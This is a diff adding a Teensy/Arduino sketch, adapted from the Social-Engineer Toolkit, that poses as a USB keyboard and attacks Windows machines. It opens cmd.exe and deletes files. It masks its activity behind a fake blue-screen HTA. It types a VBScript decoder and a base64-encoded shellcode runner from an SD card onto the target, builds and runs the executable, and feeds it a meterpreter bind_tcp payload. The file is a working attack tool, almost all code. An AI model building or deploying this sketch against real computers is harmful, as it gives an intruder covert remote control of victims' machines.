@@ -1,0 +1,238 @@
+// idea from Social-Engineer Toolkit Tee Attack Vector
+//
+// Special thanks to: Irongeek
+//
+// Edited and adapted by INIT_6
+// Getting payload from SD card instead off server.
+//
+// Lot of code was stolen from http://dabermania.blogspot.com/
+// current msfpayload:  windows/meterpreter/bind_tcp
+//
+// ** SD card attached to SPI bus as follows:
+// ** MOSI - pin 2
+// ** MISO - pin 3
+// ** CLK - pin 1
+// ** CS - pin 0
+
+#include <SdFat.h>
+#include <Sd2Card.h>
+#include <SdVolume.h>
+#include <SdFile.h>
+#include <phukdlib.h>
+
+const int chipSelect = 0; //for Teensy 2.0
+const int ledPin = 11;   // Teensy has LED on 11
+
+Sd2Card card;
+SdVolume volume;
+SdFile root;
+SdFile file;
+
+// serial output steam
+ArduinoOutStream cout(Serial);
+
+// store error strings in flash
+#define sdErrorMsg(msg) sdErrorMsg_P(PSTR(msg));
+void sdErrorMsg_P(const char* str) {
+  cout << pgm(str) << endl;
+  if (card.errorCode()) {
+    cout << pstr("SD errorCode: ");
+    cout << hex << int(card.errorCode()) << endl;
+    cout << pstr("SD errorData: ");
+    cout << int(card.errorData()) << dec << endl;
+  }
+}
+//----------------------------------------------------------------
+
+void setup(void){
+  Serial.begin(9600);
+  
+  delay(3000); //Sometimes the drivers can't load fast enough and the script fails.
+
+  // Initialize SdFat or print a detailed error message and halt
+  // Use half speed like the native library.
+  // change to SPI_FULL_SPEED for more performance.
+  if (!card.init(SPI_HALF_SPEED, chipSelect)){
+    sdErrorMsg("\ncard.init failed");
+    return;
+  }
+  
+  // initialize a FAT volume
+  if (!volume.init(&card)){
+    sdErrorMsg("\nvolume.init failed");
+    return;
+  }
+
+  // open the root directory
+  if (!root.openRoot(&volume)){
+   sdErrorMsg("\nopenRoot failed")
+   return;
+  }
+// end SD setup. 
+
+//Open cmd using phukdlib.h lib
+   CommandAtRunBarMSWIN("cmd.exe");
+   //Delay for cmd to open
+   delay(1000);
+   
+   //resize cmd window
+   //win_ResizeWindow();
+   
+   //delete any existing files named decoder.vbs and payload.txt
+   Keyboard.print("del /f c:\\bsod.hta c:\\decode.vbs c:\\mexec.txt c:\\mexec.exe");
+   PressAndRelease(KEY_ENTER, 1);
+   
+   // open BSOD to hide all the non-sense. 
+   if (file.open(&root, "bsod.hta", O_READ)) {
+     Serial.println("Opened bsod.hta");  
+     }
+   else{
+     sdErrorMsg("\nfile.open failed");
+   }
+   
+   //start copy con to place the BSOFD on disk
+   Keyboard.print("copy con C:\\bsod.hta");
+   PressAndRelease(KEY_ENTER, 1);
+   
+   //buffer: set b to signed init, read to end of file then print the char of the signed init b.    
+   int16_t b;
+   while ((b = file.read()) > 0) Keyboard.print((char)b);
+   
+   //ctrl-z then press enter to commit copy con changes
+   Keyboard.set_modifier(MODIFIERKEY_CTRL);
+   Keyboard.send_now();
+   PressAndRelease(KEY_Z, 1);
+   Keyboard.set_modifier(0);
+   Keyboard.send_now();
+   PressAndRelease(KEY_ENTER, 1);
+   
+   //close file. 
+   file.close();
+   
+   //Run the bsod.hta
+   Keyboard.print("C:\\bsod.hta");
+   PressAndRelease(KEY_ENTER, 1);
+   
+   // open a the file containing the Decode VBScript on sdcard.
+   if (file.open(&root, "decode.txt", O_READ)) {
+     Serial.println("Opened decode.txt");  
+     }
+   else{
+     sdErrorMsg("\nfile.open failed");
+   }
+   //use echo to write the vbscript to c:\decoder.vbs
+   Keyboard.print("echo ");
+   
+   //buffer: set n to signed init, read decode.txt to end of file then print the char value of the signed init n.    
+   int16_t n;
+   while ((n = file.read()) > 0) Keyboard.print((char)n);
+   
+   Keyboard.print(" > C:\\decode.vbs");
+   PressAndRelease(KEY_ENTER, 1);
+   
+   //close file
+   file.close();      
+   
+   //begin copy of memoryshellexec in base64 to target//
+   if (file.open(&root, "mexec.txt", O_READ)) {
+     Serial.println("Opened mexec.txt");  
+     }
+   else{
+     sdErrorMsg("\nfile.open failed");
+   }
+   
+   //start copy con to place the base64 encoded text
+   Keyboard.print("echo ");
+   
+   //buffer: set q to signed init, read to end of file then print the char of the signed init q.    
+   int16_t q;
+   while ((q = file.read()) > 0) Keyboard.print((char)q);
+   
+   Keyboard.print(" > C:\\mexec.txt");
+   PressAndRelease(KEY_ENTER, 1);
+   file.close();
+   
+//run the vbscript to convert the text file to exe
+   Keyboard.print("cscript C:\\decode.vbs C:\\mexec.txt C:\\mexec.exe");
+   PressAndRelease(KEY_ENTER, 1);
+
+//Run mexec.exe to execute payload
+   Keyboard.print("C:\\mexec.exe ");
+
+//copy alphamix encoded opcodes to terminal for shellcodeexec to run.
+   if (file.open(&root, "payload.txt", O_READ)) {
+     Serial.println("Opened payload.txt");  
+     }
+   else{
+     sdErrorMsg("\nfile.open failed");
+   }
+      
+   //buffer: set t to signed init, read to end of file then print the char of the signed init t.    
+   int16_t t;
+   while ((t = file.read()) > 0) Keyboard.print((char)t);
+   
+   //close file. 
+   file.close();
+   
+   PressAndRelease(KEY_ENTER, 1);
+    
+//Turn LED light on for one sec so you know its complete.
+   pinMode(ledPin, OUTPUT);
+   digitalWrite(ledPin, HIGH);
+   delay(1000);
+   digitalWrite(ledPin, LOW);
+
+}
+void loop(void){}
+
+void win_MoveWindow(){
+ int move = 0;
+ Keyboard.set_modifier(MODIFIERKEY_ALT);
+ Keyboard.set_key1(KEY_SPACE);
+ Keyboard.send_now();
+ Keyboard.set_modifier(0);
+ Keyboard.set_key1(0);
+ Keyboard.send_now();
+ Keyboard.print("m");
+ while(move < 100) {
+  delay(5);
+  Keyboard.set_key1(KEY_UP);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  move++;
+ }
+PressAndRelease(KEY_ENTER, 1);
+}
+
+void win_ResizeWindow(){
+ int move = 0;
+ Keyboard.set_modifier(MODIFIERKEY_ALT);
+ Keyboard.set_key1(KEY_SPACE);
+ Keyboard.send_now();
+ Keyboard.set_modifier(0);
+ Keyboard.set_key1(0);
+ Keyboard.send_now();
+ Keyboard.print("s");
+ Keyboard.set_key1(KEY_LEFT);
+ Keyboard.send_now();
+ Keyboard.set_key1(0);
+ Keyboard.send_now();
+ Keyboard.set_key1(KEY_UP);
+ Keyboard.send_now();
+ Keyboard.set_key1(0);
+ Keyboard.send_now();
+  while(move < 75) {
+  delay(5);
+  Keyboard.set_key1(KEY_RIGHT);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_DOWN);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  move++;
+ }
+PressAndRelease(KEY_ENTER, 1);
+}
